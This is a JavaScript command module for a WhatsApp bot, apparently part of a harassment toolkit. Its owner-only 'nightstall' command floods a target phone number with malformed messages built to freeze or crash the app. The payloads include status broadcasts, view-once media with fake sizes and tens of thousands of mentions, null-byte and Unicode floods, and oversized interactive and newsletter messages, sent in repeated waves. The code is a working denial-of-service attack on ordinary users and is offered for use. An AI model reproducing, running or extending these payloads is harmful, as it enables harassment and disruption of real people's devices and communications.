const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

const randomDelay = (min, max) => new Promise(r => setTimeout(r, Math.floor(Math.random() * (max - min + 1)) + min));

module.exports = {
  name: 'nightstall',
  aliases: ['ns', 'stall', 'freeze', 'frostbite', 'icelock', 'freezer', 'coldsnap'],
  description: '👿 Lord Devine Attack - Status freeze destruction demon',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    const target = args[0];
    const ownerNumbers = helpers.getOwnerNumbers();
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : sender;
    
    if (!target) {
      return await sock.sendMessage(chatId, { 
        text: ` Guy your life don spoil 🤲

📱 ᴜsᴀɢᴇ: .ɴɪɢʜᴛsᴛᴀʟʟ 234✘✘✘✘
🛑 sᴛᴏᴘ: .ɴɪɢʜᴛsᴛᴀʟʟ sᴛᴏᴘ ` 
      });
    }

    if (target.toLowerCase() === 'stop') {
      const stopped = attackManager.stopAllAttacksForSender(sender);
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🛑 ᴀᴛᴛᴀᴄᴋ ʜᴀʟᴛᴇᴅ 🛑
╚═══════════════════════════════════════════╝

${stopped > 0 ? `✅ sᴛᴏᴘᴘᴇᴅ ${stopped} ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ(s)` : '⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ғᴏᴜɴᴅ'}

👿 "ᴛʜᴇ ғʀᴇᴇᴢᴇ ᴛʜᴀᴡs" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const attackId = attackManager.generateAttackId(sender, targetJid, 'nightstall');

    if (attackManager.isAttackActive(attackId)) {
      return await sock.sendMessage(chatId, { 
        text: `⚠️ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ!\n\n🛑 ᴜsᴇ .ɴɪɢʜᴛsᴛᴀʟʟ sᴛᴏᴘ ᴛᴏ ʜᴀʟᴛ` 
      });
    }

    attackManager.startAttack(attackId, {
      sender,
      target: targetJid,
      commandName: 'nightstall',
      chatId
    });

    await sock.sendMessage(chatId, { 
      text: `╔═══════════════════════════════════════════╗
║ 🧊 ɴɪɢʜᴛsᴛᴀʟʟ ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ 🧊
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ғʀᴇᴇᴢɪɴɢ sʏsᴛᴇᴍ...
🔄 ᴄʏᴄʟᴇs: 0/100

👿 "ғʀᴇᴇᴢᴇ ᴀɴᴅ ᴅᴇsᴛʀᴏʏ" ☠️
╰────────────────────────────────────────╯` 
    });

    const texts = [
      String.fromCharCode(0xA9BE).repeat(100000),
      String.fromCharCode(0x17DD).repeat(100000),
      String.fromCharCode(0x1BC0).repeat(100000),
      ".".repeat(50000) + String.fromCharCode(0x6DD).repeat(50000),
      String.fromCharCode(0x64E, 0x64F, 0x650, 0x651, 0x652).repeat(50000),
      "\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E".repeat(20000)
    ];

    const blankDelayMp3 = async () => {
      await randomDelay(200, 400);
      const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
      ];

      const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "NIGHT RAIDERS" + texts[1].substring(0, 10000),
        title: "DEMONIC FREEZE",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://t.me/NightRaiders",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
      };

      const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "LORD DEVINE NIGHTSTALL",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "NIGHT RAIDERS"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      };

      try {
        const msgVideo = generateWAMessageFromContent(targetJid, {
          viewOnceMessage: { message: { videoMessage } }
        }, {});
        await sock.relayMessage("status@broadcast", msgVideo.message, {
          messageId: msgVideo.key.id,
          statusJidList: [targetJid]
        });
      } catch (err) {
        console.error('blankDelayMp3 error:', err.message);
      }
    };

    const bulldozer5GB = async () => {
      await randomDelay(250, 500);
      const SID = "5e03e0&mms3";
      const key = "10000000_2012297619515179_5714769099548640934_n.enc";
      const type = "image/webp";

      const message = {
        viewOnceMessage: {
          message: {
            stickerMessage: {
              url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
              fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
              fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
              mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
              mimetype: type,
              directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=${SID}`,
              fileLength: { low: 999999, high: 0, unsigned: true },
              mediaKeyTimestamp: { low: Date.now() % 2147483647, high: 0, unsigned: false },
              firstFrameLength: 19904,
              firstFrameSidecar: "KN4kQ5pyABRAgA==",
              isAnimated: true,
              contextInfo: {
                participant: targetJid,
                mentionedJid: ["0@s.whatsapp.net"],
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 999999,
              },
              stickerSentTs: { low: -10000000, high: 999, unsigned: false },
              isAvatar: true,
              isAiSticker: true,
              isLottie: true
            },
          },
        },
      };

      try {
        const msg = generateWAMessageFromContent(targetJid, message, {});
        for (let i = 0; i < 5; i++) {
          await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [targetJid],
          });
          await randomDelay(50, 150);
        }
      } catch (err) {
        console.error('bulldozer5GB error:', err.message);
      }
    };

    const protocolbug6 = async () => {
      await randomDelay(200, 400);
      const quotedMessage = {
        extendedTextMessage: {
          text: texts[0].substring(0, 12000),
          matchedText: "https://" + texts[1].substring(0, 500) + ".com",
          canonicalUrl: "https://" + texts[1].substring(0, 500) + ".com",
          description: "\u0000".repeat(500),
          title: "LORD DEVINE NIGHT RAIDERS",
          previewType: "NONE",
          jpegThumbnail: Buffer.alloc(10000), 
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: true,
              title: "NIGHTREAP",
              body: "\u0000".repeat(10000),
              mediaType: 1,
              renderLargerThumbnail: true
            },
            mentionedJid: Array.from({ length: 1000 }, () => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
          }
        }
      };

      const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
      ];

      const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: texts[2].substring(0, 12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: "LORD DEVINE NIGHT RAIDERS",
            body: "\u0000".repeat(9117),
            mediaType: 1,
            renderLargerThumbnail: true
          },
          businessMessageForwardInfo: { businessOwnerJid: targetJid },
          quotedMessage: quotedMessage,
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: texts[0].substring(0, 100)
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM="
      };

      try {
        const msg = generateWAMessageFromContent(targetJid, {
          viewOnceMessage: { message: { videoMessage } }
        }, {});

        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [targetJid]
        });
      } catch (err) {
        console.error('protocolbug6 error:', err.message);
      }
    };

    const thunderStrike = async () => {
      await randomDelay(200, 500);
      try {
        const payload = await generateWAMessageFromContent(targetJid, {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { title: "LORD DEVINE NIGHTSTRIKE", hasMediaAttachment: false },
                body: { text: texts[Math.floor(Math.random() * texts.length)] },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(50000),
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({ status: true, error: "overflow".repeat(5000) })
                  }]
                },
                contextInfo: {
                  isForwarded: true,
                  forwardingScore: 9999,
                  externalAdReply: {
                    title: "LORD DEVINE ATTACK",
                    body: texts[0].substring(0, 20000),
                    mediaType: 1,
                    thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg"
                  }
                }
              }
            }
          }
        }, {});

        await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id });
      } catch (err) {
        console.error('Nightstrike thunder error:', err.message);
      }
    };

    const lightningBolt = async () => {
      await randomDelay(300, 600);
      try {
        await sock.relayMessage(targetJid, {
          extendedTextMessage: {
            text: texts[Math.floor(Math.random() * texts.length)],
            contextInfo: {
              stanzaId: targetJid,
              participant: targetJid,
              quotedMessage: { conversation: "NIGHTSTRIKE" + texts[2].substring(0, 50000) },
              disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" }
            },
            inviteLinkGroupTypeV2: "DEFAULT"
          }
        }, { participant: { jid: targetJid } });
      } catch (err) {
        console.error('Nightstrike lightning error:', err.message);
      }
    };

    const kill = async () => {
      for (let wave = 0; wave < 15; wave++) {
        if (!attackManager.isAttackActive(attackId)) break;
        try {
          await randomDelay(200, 400);
          const p1 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/999999999_000000000000000000000000000000_n.enc",
                  mimetype: "image/jpeg",
                  fileLength: "999999999999",
                  jpegThumbnail: Buffer.alloc(1024 * 1024, 0),
                  contextInfo: {
                    mentionedJid: Array.from({length: 50000}, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
                    forwardingScore: 999999999,
                    isForwarded: true
                  }
                }
              }
            }
          }, {});

          const p2 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "0".repeat(99999) + "@newsletter",
                  newsletterName: texts[0].substring(0, 100000),
                  caption: ""
                }
              }
            }
          }, {});

          const p3 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: { text: "" },
                  nativeFlowMessage: {
                    name: "DEATH",
                    paramsJson: "\u0000".repeat(500000) + texts[1].substring(0, 100000)
                  },
                  messageContextInfo: { messageSecret: crypto.randomBytes(64) }
                }
              }
            }
          }, {});

          const p4 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                videoMessage: {
                  fileLength: "999999999999999",
                  seconds: 999999999,
                  mediaKey: crypto.randomBytes(32).toString('base64'),
                  streamingSidecar: Buffer.alloc(2 * 1024 * 1024, 0),
                  contextInfo: {
                    externalAdReply: {
                      title: "",
                      body: texts[2].substring(0, 100000),
                      thumbnail: Buffer.alloc(1024 * 1024, 0)
                    },
                    mentionedJid: Array(100000).fill("0@s.whatsapp.net")
                  }
                }
              }
            }
          }, {});

          for (let i = 0; i < 10; i++) {
            const payloads = [p1, p2, p3, p4];
            for (const payload of payloads) {
              try {
                await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id });
                await randomDelay(30, 80);
              } catch (_) {}
            }
          }
        } catch (err) {
          console.error('Nightstall kill wave error:', err.message);
        }
      }
    };

    try {
      await blankDelayMp3();
      await bulldozer5GB();
      await protocolbug6();
      await thunderStrike();
      await lightningBolt();
      await kill();

      attackManager.stopAttack(attackId);

      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ ✅ ɴɪɢʜᴛsᴛᴀʟʟ ᴄᴏᴍᴘʟᴇᴛᴇ ✅
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: sʏsᴛᴇᴍ ғʀᴏᴢᴇɴ

👿 "ғʀᴏᴢᴇɴ ɪɴ ᴛʜᴇ ᴅᴀʀᴋɴᴇss" ☠️
╰────────────────────────────────────────╯` 
      });
    } catch (err) {
      console.error('Nightstall execution error:', err);
      attackManager.stopAttack(attackId);
      await sock.sendMessage(chatId, { 
        text: `⛔ ᴇʀʀᴏʀ: ${err.message}` 
      });
    }
  }
};
